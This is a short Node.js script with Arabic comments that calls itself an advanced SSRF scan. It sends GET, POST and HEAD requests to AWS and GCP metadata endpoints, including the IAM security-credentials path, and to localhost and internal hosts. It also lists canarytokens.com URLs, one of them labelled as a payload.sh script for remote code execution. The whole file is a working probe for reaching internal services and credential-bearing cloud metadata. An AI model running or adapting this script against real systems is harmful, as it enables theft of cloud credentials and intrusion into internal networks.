const axios = require('axios');

const TARGET_URLS = [
  'http://169.254.169.254/latest/meta-data/',
  'http://169.254.169.254/latest/user-data/',
  'http://169.254.169.254/latest/meta-data/iam/security-credentials/',
  'http://metadata.google.internal/computeMetadata/v1/instance/id',
  'http://metadata.google.internal/computeMetadata/v1/project/project-id',
  'http://localhost/',
  'http://localhost:3000/',
  'http://127.0.0.1/',
  'http://127.0.0.1:5000/',
  'http://127.0.0.1:8080/',
  'http://internal/',
  'http://internal.website/',
  'http://docker.for.mac.localhost/',
  'http://canarytokens.com/articles/YOUR-TOKEN/contact.php',  // ضع التوكن الخاص بك
  'http://canarytokens.com/articles/qczfimih1tdawvj4ijjldi9fp/payload.sh' // سكربت RCE لو عندك سيرفر خاص
];

const METHODS = ['GET', 'POST', 'HEAD'];

async function ssrfTest() {
  console.log('🚀 بدء فحص SSRF المتقدم...\n');

  for (const url of TARGET_URLS) {
    for (const method of METHODS) {
      try {
        console.log(`🔎 Trying [${method}] ${url}`);

        const config = {
          method,
          url,
          timeout: 3500,
          headers: {}
        };

        // إضافة Header خاص لـ GCP Metadata إذا احتجت
        if (url.includes('metadata.google.internal')) {
          config.headers['Metadata-Flavor'] = 'Google';
        }

        const res = await axios(config);
        console.log(`✅ [${method}] ${url} - Status ${res.status}`);
      } catch (err) {
        const msg = err.code || err.message || 'unknown error';
        console.log(`❌ [${method}] ${url} - ${msg}`);
      }
    }
  }

  console.log('\n✅ انتهى الفحص.');
}

ssrfTest();
